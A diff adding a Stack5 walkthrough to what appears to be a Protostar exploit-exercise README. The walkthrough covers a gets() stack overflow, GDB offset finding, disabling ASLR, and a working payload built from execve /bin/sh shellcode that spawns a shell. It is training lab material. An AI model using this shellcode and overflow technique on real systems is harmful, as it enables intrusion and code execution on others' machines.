@@ -13,6 +13,7 @@ NOTE: write ups in progress. Adding python exploit poc's to each excercise for p
 |[Stack2](#stack2)|
 |[Stack3](#stack3)|
 |[Stack4](#stack4)|
+|[Stack5](#stack5)|
 |[Format0](#format0)|
 |[Format1](#format1)|
 |[Format2](#format2)|
@@ -377,6 +378,176 @@ print(input)
 cproc = Popen(["./stack4"], stdin=PIPE, stdout=PIPE)
 print cproc.communicate(input)
 ```
+
+
+
+##Stack5
+---------------------------------------
+###Source Code:
+```C
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+  char buffer[64];
+
+  gets(buffer);
+}
+```
+###Stack:
+| eip | ebp |  buffer    |
+
+###Plan:
+Simple overflow, but this time we need to get some shellcode to run. 
+Objectives:
+-figure out where input starts in memory
+-determine EIP location to overwrite 
+-craft input that fills memory with shellcode and overwrites EIP so that our program returns to the shellcode location and executes.
+
+NOTES: this is the first exercise where ASLR will mess up your exploit because every time the program executes, the location that your shellcode sits in memory will change. Use the following command:
+```bash
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+```
+Next, fire up GDB
+
+```bash
+$ gdb ./stack5
+Reading symbols from ./stack5...done.
+gdb$ disas main
+Dump of assembler code for function main:
+   0x080483c4 <+0>:     push   %ebp
+   0x080483c5 <+1>:     mov    %esp,%ebp
+   0x080483c7 <+3>:     and    $0xfffffff0,%esp
+   0x080483ca <+6>:     sub    $0x50,%esp
+   0x080483cd <+9>:     lea    0x10(%esp),%eax
+   0x080483d1 <+13>:    mov    %eax,(%esp)
+   0x080483d4 <+16>:    call   0x80482e8 <gets@plt>
+   0x080483d9 <+21>:    leave  
+   0x080483da <+22>:    ret    
+End of assembler dump.
+
+gdb$ b *0x080483d9                                                              #break right after gets
+Breakpoint 1 at 0x80483d9: file stack5/stack5.c, line 11.
+gdb$ run
+Starting program: /home/ubuntu/exploit-exercises-pwntools/protostar/stack5 
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa                                     #give some input
+
+Breakpoint 1, main (argc=0x1, argv=0xffffd6c4) at stack5/stack5.c:11
+11      stack5/stack5.c: No such file or directory.
+gdb$ x/40wx $esp
+0xffffd5d0:     0xffffd5e0      0xffffd5fe      0xf7e23c34      0xf7e49fe3
+0xffffd5e0:     0x61616161      0x61616161      0x61616161      0x61616161    #< we see where the input begins
+0xffffd5f0:     0x61616161      0x61616161      0x61616161      0x61616161
+0xffffd600:     0x61616161      0x61616161      0x00616161      0xf7e4a19d
+0xffffd610:     0xf7fbe3c4      0xf7ffd000      0x080483fb      0xf7fbe000
+0xffffd620:     0x080483f0      0x00000000      0x00000000      0xf7e30ad3
+0xffffd630:     0x00000001      0xffffd6c4      0xffffd6cc      0xf7feacca
+0xffffd640:     0x00000001      0xffffd6c4      0xffffd664      0x080495a0
+0xffffd650:     0x08048204      0xf7fbe000      0x00000000      0x00000000
+0xffffd660:     0x00000000      0x91b2c852      0xa80b8c42      0x00000000
+gdb$ p $ebp
+$1 = (void *) 0xffffd628                                                    #get ebp and add 4 to get EIP
+gdb$ p $1+4
+$2 = (void *) 0xffffd62c
+gdb$ p $2 - 0xffffd5e0                                                      #subtract the mem location where our input starts
+$3 = (void *) 0x4c                                                          #from EIP location to get our offset  (0x4c)
+gdb$ 
+```
+
+So now we have our locations and our offset. Time to craft an input. I used http://shell-storm.org/shellcode/ to find some shellcode to use. I settled on http://shell-storm.org/shellcode/files/shellcode-811.php for this example, which is a basic 28byte execve(bin/sh) command. 
+
+For our input, we'll put our shellcode + filler + target return location
+```bash
+python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+('a'*48)+'\xe0\xd5\xff\xff'"  > testme
+```
+Now we test with GDB
+```bash
+$ gdb ./stack5
+Reading symbols from ./stack5...done.
+gdb$ b *0x080483d9
+Breakpoint 1 at 0x80483d9: file stack5/stack5.c, line 11.
+gdb$ run < testme 
+Breakpoint 1, main (argc=0x0, argv=0xffffd6c4) at stack5/stack5.c:11
+11      stack5/stack5.c: No such file or directory.
+gdb$ x/40wx $esp
+0xffffd5d0:     0xffffd5e0      0xffffd5fe      0xf7e23c34      0xf7e49fe3
+0xffffd5e0:     0x6850c031      0x68732f2f      0x69622f68      0x89e3896e   #shell code is in place
+0xffffd5f0:     0xb0c289c1      0x3180cd0b      0x80cd40c0      0x61616161
+0xffffd600:     0x61616161      0x61616161      0x61616161      0x61616161
+0xffffd610:     0x61616161      0x61616161      0x61616161      0x61616161
+0xffffd620:     0x61616161      0x61616161      0x61616161      0xffffd5e0   #return looks good
+0xffffd630:     0x00000000      0xffffd6c4      0xffffd6cc      0xf7feacca
+0xffffd640:     0x00000001      0xffffd6c4      0xffffd664      0x080495a0
+0xffffd650:     0x08048204      0xf7fbe000      0x00000000      0x00000000
+0xffffd660:     0x00000000      0xd40c28cd      0xedb56cdd      0x00000000
+
+gdb$ c
+Continuing.
+process 31143 is executing new program: /bin/dash                           #boom
+Warning:
+Cannot insert breakpoint 1.
+Cannot access memory at address 0x80483d9
+
+```
+Great! So our exploit works in GDB, lets try it outside of the debugger--
+
+```bash
+python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+('a'*48)+'\xe0\xd5\xff\xff'" | ./stack5                                                                                                                                                                                                  
+Illegal instruction (core dumped)   #not so fast!
+``` 
+So what happened? Well, there are some differences in how the program runs when you run it normally and within GDB. 
+So we will take a look at the core dump to see what's going on and see where exactly everything sits in memory when a user runs the program.
+```bash
+$ python -c "print 'a'*76+'xxxx'" | ./stack5
+Segmentation fault (core dumped)
+$ gdb ./stack5 core -q
+warning: ~/.gdbinit.local: No such file or directory
+Reading symbols from ./stack5...done.
+[New LWP 31596]
+Core was generated by `./stack5'.
+Program terminated with signal SIGSEGV, Segmentation fault.
+#0  0x78787878 in ?? ()
+gdb$ x/60wx 0xffffd5e0
+0xffffd5e0:     0x08048204      0xf7fbe000      0xf7fbec20      0xf7e7b506
+0xffffd5f0:     0xf7fbec20      0xffffd641      0x7fffffff      0x0000000a
+0xffffd600:     0x00000000      0xf7fbe000      0x00000000      0x00000000
+0xffffd610:     0xffffd688      0xf7ff04c0      0xf7e7b449      0xf7fbe000
+0xffffd620:     0x00000000      0x00000000      0xffffd688      0x080483d9
+0xffffd630:     0xffffd640      0xffffd65e      0xf7e23c34      0xf7e49fe3
+0xffffd640:     0x61616161      0x61616161      0x61616161      0x61616161 #< we can see the location changed
+0xffffd650:     0x61616161      0x61616161      0x61616161      0x61616161
+0xffffd660:     0x61616161      0x61616161      0x61616161      0x61616161
+0xffffd670:     0x61616161      0x61616161      0x61616161      0x61616161
+0xffffd680:     0x61616161      0x61616161      0x61616161      0x78787878  ##< return
+0xffffd690:     0x00000000      0xffffd724      0xffffd72c      0xf7feacca
+0xffffd6a0:     0x00000001      0xffffd724      0xffffd6c4      0x080495a0
+0xffffd6b0:     0x08048204      0xf7fbe000      0x00000000      0x00000000
+0xffffd6c0:     0x00000000      0xa9142257      0x90ac2647      0x00000000
+```
+So we alter our input with the new memory locations, and come up with an input like this:
+```bash
+$ python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+('a'*48)+'\x40\xd6\xff\xff'" > stack5sploit
+```
+Now for some weirdness . I was stuck for a while on this part, because if you run this
+```bash
+$ cat stack5sploit | ./stack5
+$ 
+```
+Nothing happens. After some research, I found a few solutions. Apparently shell redirection "<"
+appends an EOF after redirecting payload5.
+You can choose a different shellcode, or use the following trick. (thanks http://www.kroosec.com/2012/12/protostar-stack5.html)
+```bash
+(cat stack5sploit; cat) | ./stack5
+```
+###winning command:
+```bash
+$ python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+('a'*48)+'\x40\xd6\xff\xff'" > stack5sploit
+(cat stack5sploit; cat) | ./stack5
+```
+
 
 
 
